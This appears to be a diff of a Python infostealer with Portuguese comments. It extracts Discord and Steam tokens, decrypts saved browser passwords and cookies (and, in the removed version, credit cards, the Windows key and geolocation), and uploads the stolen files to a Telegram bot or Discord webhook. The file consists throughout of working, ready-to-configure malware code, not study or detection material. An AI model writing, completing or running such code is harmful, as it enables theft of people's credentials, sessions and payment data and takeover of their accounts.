@@ -1,389 +1,249 @@
 import os
 import re
-import subprocess
-from shutil import copy2
 from base64 import b64decode
 from json import loads
+from shutil import copy2
 from sqlite3 import connect
 import win32crypt
 from Crypto.Cipher import AES
-import socket
-import requests
-import platform
-import uuid
-import sqlite3
-import tempfile
-import psutil
-import time
+from requests import post
 
-# Obtendo os diretórios do sistema
+# ------------------- Configurações de Caminho -------------------
+
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 
 tokenPaths = {
-    'Discord': rf"{roaming}\Discord",
-    'Discord Canary': rf"{roaming}\discordcanary",
-    'Discord PTB': rf"{roaming}\discordptb",
-    'Google Chrome': rf"{local}\Google\Chrome\User Data\Default",
-    'Opera': rf"{roaming}\Opera Software\Opera Stable",
-    'Brave': rf"{local}\BraveSoftware\Brave-Browser\User Data\Default",
-    'Yandex': rf"{local}\Yandex\YandexBrowser\User Data\Default",
-    'OperaGX': rf"{roaming}\Opera Software\Opera GX Stable",
-    'Steam': rf"{roaming}\Steam"
+    'Discord': f"{roaming}\\Discord",
+    'Discord Canary': f"{roaming}\\discordcanary",
+    'Discord PTB': f"{roaming}\\discordptb",
+    'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
+    'Opera': f"{roaming}\\Opera Software\\Opera Stable",
+    'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
+    'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
 }
 
 browser_loc = {
-    "Chrome": rf"{local}\Google\Chrome",
-    "Brave": rf"{local}\BraveSoftware\Brave-Browser",
-    "Edge": rf"{local}\Microsoft\Edge",
-    "Opera": rf"{roaming}\Opera Software\Opera Stable",
-    "OperaGX": rf"{roaming}\Opera Software\Opera GX Stable",
+    "Chrome": f"{local}\\Google\\Chrome",
+    "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
+    "Edge": f"{local}\\Microsoft\\Edge",
+    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
+    "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
 }
 
-# Funções para obter o caminho correto dos arquivos do navegador
-def Local_State(path):
-    return rf"{path}\User Data\Local State"
+fileCookies = "cookies_" + os.getlogin() + ".txt"
+filePass = "senhas_" + os.getlogin() + ".txt"
+fileInfo = "info_" + os.getlogin() + ".txt"
 
-def Login_Data(path):
-    return rf"{path}\User Data\Default\Login Data" if "Profile" not in path else rf"{path}\Login Data"
+# ------------------- Perfis do Chrome -------------------
 
-def Cookies(path):
-    return rf"{path}\User Data\Default\Network\Cookies" if "Profile" not in path else rf"{path}\Network\Cookies"
+for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
+    if i.startswith("Profile "):
+        browser_loc["ChromeP"] = f"{local}\\Google\\Chrome\\User Data\\{i}"
 
-# Função para obter informações do sistema
-def get_system_info():
-    try:
-        os_info = {
-            "Nome do Computador": platform.node(),
-            "Sistema Operacional": platform.system() + " " + platform.release(),
-            "Chave do Windows": get_windows_key(),
-            "Endereço MAC": get_mac_address()
-        }
-        return os_info
-    except Exception as e:
-        return {"Erro": str(e)}
+# ------------------- Tokens do Discord -------------------
 
-# Função para coletar o endereço MAC
-def get_mac_address():
-    try:
-        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])
-        return mac if mac else "Endereço MAC não encontrado."
-    except Exception:
-        return "Endereço MAC não encontrado."
-
-# Função para obter a chave do Windows
-def get_windows_key():
-    try:
-        key = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True)
-        return key.strip().decode().split('\n')[1]
-    except Exception:
-        return "Chave do Windows não encontrada."
-
-# Função para descriptografar token do Discord
 def decrypt_token(buff, master_key):
     try:
-        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
+                       buff[3:15]).decrypt(buff[15:])[:-16].decode()
     except:
-        return None
+        pass
 
-# Função para descriptografar cookies da Steam
-def decrypt_cookie(encrypted_cookie, master_key):
-    try:
-        init_vector = encrypted_cookie[3:15]
-        enc_pass = encrypted_cookie[15:-16]
-        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
-        decrypted_cookie = cipher.decrypt(enc_pass).decode()
-        return decrypted_cookie
-    except Exception as e:
-        print(f"Erro ao descriptografar o cookie: {e}")
-        return None
-
-# Função para encerrar processos do navegador para evitar erros de permissão
-def close_browser_process(browser_name):
-    for proc in psutil.process_iter(['pid', 'name']):
-        if proc.info['name'].lower() == browser_name.lower():
-            try:
-                proc.kill()
-                print(f"Processo {browser_name} encerrado.")
-            except psutil.NoSuchProcess:
-                pass
-            except psutil.AccessDenied:
-                print(f"Erro: Acesso negado ao processo {proc.info['pid']}.")
-
-# Função ajustada para extrair tokens de várias plataformas
 def get_tokens(path):
-    tokens = set()
-    lev_db = rf"{path}\Local Storage\leveldb"
-    loc_state = rf"{path}\Local State"
-
-    if os.path.exists(loc_state):
-        print(f"Local State encontrado em: {loc_state}")
-        try:
-            with open(loc_state, "r") as file:
-                key = loads(file.read())['os_crypt']['encrypted_key']
-                key = b64decode(key)[5:]  # Chave mestre descriptografada
-                master_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
-        except Exception as e:
-            print(f"Erro ao obter a chave mestra: {e}")
-            return list(tokens)
-
-        if os.path.exists(lev_db):
-            for file_name in os.listdir(lev_db):
-                if file_name.endswith((".ldb", ".log", ".sqlite")):
-                    try:
-                        with open(os.path.join(lev_db, file_name), "r", errors='ignore') as files:
-                            for line in files.readlines():
-                                line = line.strip()
-
-                                # Captura o cookie steamLoginSecure
-                                if 'steamLoginSecure' in line:
-                                    try:
-                                        # Descriptografa o cookie de sessão da Steam
-                                        decrypted_cookie = decrypt_cookie(b64decode(line), master_key)
-                                        if decrypted_cookie:
-                                            tokens.add(decrypted_cookie)
-                                            print(f"Cookie steamLoginSecure descriptografado: {decrypted_cookie}")
-                                        else:
-                                            print("Falha ao descriptografar steamLoginSecure.")
-                                    except Exception as e:
-                                        print(f"Erro ao tentar descriptografar o cookie steamLoginSecure: {e}")
-                                        continue
-
-                                # Captura tokens de diferentes formatos (incluindo Discord)
-                                token_match = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}', line)
-                                mfa_match = re.findall(r'mfa\.[\w-]{84}', line)
-
-                                for token in token_match + mfa_match:
-                                    try:
-                                        decrypted = decrypt_token(b64decode(token), master_key)
-                                        if decrypted:
-                                            tokens.add(decrypted)
-                                            print(f"Token descriptografado: {decrypted}")
-                                        else:
-                                            tokens.add(token)
-                                            print(f"Token adicionado sem descriptografia: {token}")
-                                    except Exception as e:
-                                        print(f"Erro ao descriptografar token: {e}")
-                                        tokens.add(token)
-                                        continue
-
-                    except PermissionError as e:
-                        print(f"Erro de permissão ao acessar {file_name}: {e}")
-                        continue
-                    except Exception as e:
-                        print(f"Erro ao processar {file_name}: {e}")
-                        continue
-        else:
-            print(f"Diretório LevelDB não encontrado em: {lev_db}")
-    else:
-        print(f"Local State não encontrado em: {loc_state}. Tentando método sem criptografia.")
-
-    return list(tokens)
-
-# Função para descriptografar o conteúdo do navegador e extrair os dados
-def decrypt_browser(LocalState, LoginData, CookiesFile, name):
-    message = ""
-    close_browser_process(name)  # Encerra o navegador antes de tentar descriptografar
-
-    try:
-        if os.path.exists(LocalState):
-            with open(LocalState) as f:
-                local_state = loads(f.read())
-                master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-
-                # Criação do arquivo temporário para Login Data
-                with tempfile.NamedTemporaryFile(delete=False) as temp_login:
-                    if os.path.exists(LoginData):
-                        copy2(LoginData, temp_login.name)
-                        with connect(temp_login.name) as conn:
-                            cur = conn.cursor()
-                            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-                            message += f"\n{name} - Login \n"
-                            for logins in cur.fetchall():
-                                try:
-                                    if logins[0] and logins[1] and logins[2]:
-                                        ciphers = logins[2]
-                                        init_vector = ciphers[3:15]
-                                        enc_pass = ciphers[15:-16]
-
-                                        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
-                                        dec_pass = cipher.decrypt(enc_pass).decode()
-                                        message += f"URL: {logins[0]}\nUsuário: {logins[1]}\nSenha: {dec_pass}\n"
-                                except Exception as e:
-                                    message += f"Erro ao descriptografar login para {logins[0]}: {str(e)}\n"
-                                    continue
-
-                # Criação do arquivo temporário para Cookies
-                with tempfile.NamedTemporaryFile(delete=False) as temp_cookie:
-                    if os.path.exists(CookiesFile):
-                        copy2(CookiesFile, temp_cookie.name)
-                        with connect(temp_cookie.name) as conn:
-                            curr = conn.cursor()
-                            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
-                            message += f"\n{name} - Cookies \n"
-                            for cookies in curr.fetchall():
-                                try:
-                                    if cookies[0] and cookies[1] and cookies[2] and "google" not in cookies[0]:
-                                        ciphers = cookies[2]
-                                        init_vector = ciphers[3:15]
-                                        enc_pass = ciphers[15:-16]
-                                        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
-                                        dec_pass = cipher.decrypt(enc_pass).decode()
-                                        message += f'URL: {cookies[0]}\nNome: {cookies[1]}\nCookie: {dec_pass}\n'
-                                except Exception as e:
-                                    message += f"Erro ao descriptografar cookie para {cookies[0]}: {str(e)}\n"
-                                    continue
-    except Exception as e:
-        message += f"Erro ao descriptografar dados do navegador {name}: {str(e)}\n"
-
-    return message.strip()
-
-# Função para extrair dados de cartão de crédito baseados em Chromium
-def extrair_cartao_credito(LocalState, LoginData, browser_name):
-    message = ""
-    close_browser_process(browser_name)  # Encerra o navegador antes de tentar descriptografar
-
-    try:
-        if os.path.exists(LocalState):
-            with open(LocalState, "r") as f:
-                local_state = loads(f.read())
-                encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key", None)
-
-                if not encrypted_key:
-                    raise ValueError("Chave mestra criptografada não encontrada em LocalState.")
-
-                master_key = b64decode(encrypted_key)[5:]
-                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-
-                # Criação do arquivo temporário para o Login Data
-                with tempfile.NamedTemporaryFile(delete=False) as temp_card:
-                    if os.path.exists(LoginData):
-                        copy2(LoginData, temp_card.name)
-                        with connect(temp_card.name) as conn:
-                            cur = conn.cursor()
-                            try:
-                                cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
-                                message += "\nCartões de Crédito\n"
-
-                                for card in cur.fetchall():
-                                    try:
-                                        if card[0] and card[1] and card[2] and card[3]:
-                                            ciphers = card[3]
-
-                                            if len(ciphers) >= 16:
-                                                init_vector = ciphers[3:15]
-                                                enc_pass = ciphers[15:-16]
-
-                                                cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
-                                                dec_pass = cipher.decrypt(enc_pass).decode()
-                                                message += f"Nome no Cartão: {card[0]}\nMês Expiração: {card[1]}\nAno Expiração: {card[2]}\nNúmero do Cartão: {dec_pass}\n"
-                                            else:
-                                                message += f"Valor criptografado do cartão é inválido. Tamanho insuficiente.\n"
-                                    except (ValueError, KeyError, IndexError, sqlite3.Error) as e:
-                                        message += f"Erro ao descriptografar cartão de crédito: {str(e)}\n"
-                                        continue
-                            except sqlite3.OperationalError as e:
-                                message += f"Tabela credit_cards não encontrada: {str(e)}\n"
-    except Exception as e:
-        message += f"Erro ao descriptografar cartões de crédito: {str(e)}\n"
-
-    return message.strip()
-
-# Função para enviar dados ao webhook
-def post_to(file_content):
-    webhook_url = "URL DO WEBHOOK"  # URL do webhook do Discord
-
-    try:
-        response = requests.post(webhook_url, json={"content": file_content})
-        if response.status_code in [200, 204]:
-            print("Mensagem enviada com sucesso.")
-        else:
-            print(f"Erro ao enviar mensagem: Status {response.status_code}")
-    except Exception as e:
-        print(f"Erro ao enviar para o webhook: {e}")
-
-# Função para coletar geolocalização e IPs
-def extrair_info_geografica():
-    try:
-        response = requests.get("https://ipinfo.io/")
-        data = response.json()
-        geo_text = (f"Informações Geográficas:\n"
-                    f"IP Público: {data['ip']}\n"
-                    f"Localização: {data['city']}, {data['region']}, {data['country']}\n"
-                    f"Coordenadas: {data['loc']}\n")
-        return geo_text.strip()
-    except Exception as e:
-        return f"Erro ao obter informações geográficas: {str(e)}"
-
-# Função para obter IP privado e público
-def extrair_ips():
-    hostname = socket.gethostname()
-    ip_privado = socket.gethostbyname(hostname)
-
-    ip_text = f"Informações de IP:\nIP Privado: {ip_privado}\n"
-    try:
-        ip_publico = requests.get('https://api.ipify.org').text
-        ip_text += f"IP Público: {ip_publico}\n"
-    except Exception as e:
-        ip_text += f"Erro ao obter IP público: {str(e)}"
+    limpo = []
+    tokens = []
+    finalizado = []
+    lev_db = f"{path}\\Local Storage\\leveldb\\"
+    loc_state = f"{path}\\Local State"
     
-    return ip_text.strip()
-
-# Função principal para consolidar as informações e enviá-las
-def main():
-    mensagem = ""
-    mensagens_adicionais = set()
-
-    sys_info = get_system_info()
-    for key, value in sys_info.items():
-        mensagem += f"{key}: {value}\n"
-
-    tokens_info = main_tokens()
-    if tokens_info:
-        mensagem += tokens_info + "\n"
-    else:
-        mensagem += "Tokens não encontrados.\n"
-
-    geo_info = extrair_info_geografica()
-    if geo_info.strip() and geo_info.strip() not in mensagens_adicionais:
-        mensagem += geo_info + "\n"
-        mensagens_adicionais.add(geo_info.strip())
-
-    ip_info = extrair_ips()
-    if ip_info.strip() and ip_info.strip() not in mensagens_adicionais:
-        mensagem += ip_info + "\n"
-        mensagens_adicionais.add(ip_info.strip())
-
-    cartao_info = ""
-    for name, path in browser_loc.items():
-        browser_data = decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), name)
-        if browser_data.strip() and browser_data.strip() not in mensagens_adicionais:
-            mensagem += browser_data
-            mensagens_adicionais.add(browser_data.strip())
-        else:
-            mensagem += f"Nenhum dado encontrado para o navegador {name}.\n"
-
-        cartao_info += extrair_cartao_credito(Local_State(path), Login_Data(path), name) + ""
-
-    if cartao_info.strip():
-        mensagem += cartao_info.strip()
-    else:
-        mensagem += "Nenhum cartão de crédito encontrado.\n"
-
-    post_to(mensagem.strip())
-
-def main_tokens():
-    mensagem_tokens = ""
-    for platform, path in tokenPaths.items():
-        if os.path.exists(path):
-            tokens = get_tokens(path)
-            if tokens:
-                mensagem_tokens += f"\nTokens {platform}:\n" + "\n".join(tokens) + "\n"
+    if os.path.exists(loc_state):
+        with open(loc_state, "r") as file:
+            key = loads(file.read())['os_crypt']['encrypted_key']
+        for file in os.listdir(lev_db):
+            if not file.endswith(".ldb") and file.endswith(".log"):
+                continue
             else:
-                mensagem_tokens += f"\nNenhum token encontrado para {platform}."
+                try:
+                    with open(lev_db + file, "r", errors='ignore') as files:
+                        for x in files.readlines():
+                            x.strip()
+                            for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                tokens.append(values)
+                except PermissionError:
+                    continue
+        for i in tokens:
+            if i.endswith("\\"):
+                i.replace("\\", "")
+            elif i not in limpo:
+                limpo.append(i)
+        for token in limpo:
+            finalizado += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]
+    else:
+        for file_name in os.listdir(path):
+            try:
+                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                    continue
+                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                        for token in re.findall(regex, line):
+                            finalizado.append(token)
+            except:
+                continue
+
+    return finalizado
+
+# ------------------- Funções para Descriptografar -------------------
+
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+# ------------------- Descriptografar Dados do Navegador -------------------
+
+def decrypt_browser(LocalState, LoginData, CookiesFile, name):
+    if os.path.exists(LocalState):
+        with open(LocalState) as f:
+            local_state = f.read()
+            local_state = loads(local_state)
+        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+        if os.path.exists(LoginData):
+            copy2(LoginData, "TempMan.db")
+            with connect("TempMan.db") as conn:
+                cur = conn.cursor()
+            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+            with open(filePass, "a") as f:
+                f.write(f"*** {name} ***\n")
+            for index, logins in enumerate(cur.fetchall()):
+                try:
+                    if not logins[0]:
+                        continue
+                    if not logins[1]:
+                        continue
+                    if not logins[2]:
+                        continue
+                    ciphers = logins[2]
+                    init_vector = ciphers[3:15]
+                    enc_pass = ciphers[15:-16]
+
+                    cipher = generate_cipher(master_key, init_vector)
+                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
+                    to_print = f"URL : {logins[0]}\nNome: {logins[1]}\nSenha: {dec_pass}\n\n"
+                    with open(filePass, "a") as f:
+                        f.write(to_print)
+                except (Exception, FileNotFoundError):
+                    pass
         else:
-            mensagem_tokens += f"\nCaminho não encontrado para {platform}."
-    return mensagem_tokens.strip()
+            with open(fileInfo, "a") as f:
+                f.write(f"{name} Arquivo Login Data não encontrado\n")
+        
+        if os.path.exists(CookiesFile):
+            copy2(CookiesFile, "CookMe.db")
+            with connect("CookMe.db") as conn:
+                curr = conn.cursor()
+            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
+            with open(fileCookies, "a") as f:
+                f.write(f"*** {name} ***\n")
+            for index, cookies in enumerate(curr.fetchall()):
+                try:
+                    if not cookies[0]:
+                        continue
+                    if not cookies[1]:
+                        continue
+                    if not cookies[2]:
+                        continue
+                    if "google" in cookies[0]:
+                        continue
+                    ciphers = cookies[2]
+                    init_vector = ciphers[3:15]
+                    enc_pass = ciphers[15:-16]
+                    cipher = generate_cipher(master_key, init_vector)
+                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
+                    to_print = f'URL : {cookies[0]}\nNome: {cookies[1]}\nCookie: {dec_pass}\n\n'
+                    with open(fileCookies, "a") as f:
+                        f.write(to_print)
+                except (Exception, FileNotFoundError):
+                    pass
+        else:
+            with open(fileInfo, "a") as f:
+                f.write(f"{name} Arquivo de Cookie não encontrado\n")
+    else:
+        with open(fileInfo, "a") as f:
+            f.write(f"{name} Arquivo Local State não encontrado\n")
+
+# ------------------- Funções Auxiliares de Caminho -------------------
+def Local_State(path):
+    return f"{path}\\User Data\\Local State"
+
+def Login_Data(path):
+    if "Profile" in path:
+        return f"{path}\\Login Data"
+    else:
+        return f"{path}\\User Data\\Default\\Login Data"
+
+def Cookies(path):
+    if "Profile" in path:
+        return f"{path}\\Network\\Cookies"
+    else:
+        return f"{path}\\User Data\\Default\\Network\\Cookies"
+
+# ------------------- Manipulação de Tokens -------------------
+def main_tokens():
+    for plataforma, path in tokenPaths.items():
+        if not os.path.exists(path):
+            continue
+        try:
+            tokens = set(get_tokens(path))
+        except:
+            continue
+        if not tokens:
+            continue
+        with open(fileInfo, "a") as f:
+            for i in tokens:
+                f.write(str(i) + "\n")
+
+def decrypt_files(path, browser):
+    if os.path.exists(path):
+        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)
+    else:
+        with open(fileInfo, "a") as f:
+            f.write(browser + " não instalado\n")
+
+# ------------------- Envio para Webhook -------------------
+def post_to(file):
+    token = "TOKEN DO TELEGRAM"
+    chat_id = "ID DO CHAT DO TELEGRAM"
+    webhook_url = "URL WEBHOOK"
+    
+    if token != "TOKEN DO TELEGRAM" and chat_id != "ID DO CHAT DO TELEGRAM":
+        post("https://api.telegram.org/bot" + token + "/sendDocument", data={'chat_id': chat_id},
+             files={'document': open(file, 'rb')})
+    
+    if webhook_url != "URL DO WEBHOOK":
+        post(webhook_url, files={'files': open(file, 'rb')})
+
+# ------------------- Manipulação de Arquivos -------------------
+for_handler = (fileInfo, filePass, fileCookies, "TempMan.db", "CookMe.db")
+
+def file_handler(file):
+    if os.path.exists(file):
+        if ".txt" in file:
+            post_to(file)
+        os.remove(file)
+
+# ------------------- Função Principal -------------------
+def main():
+    for nome, path in browser_loc.items():
+        decrypt_files(path, nome)
+    main_tokens()
+    for i in for_handler:
+        file_handler(i)
 
 main()
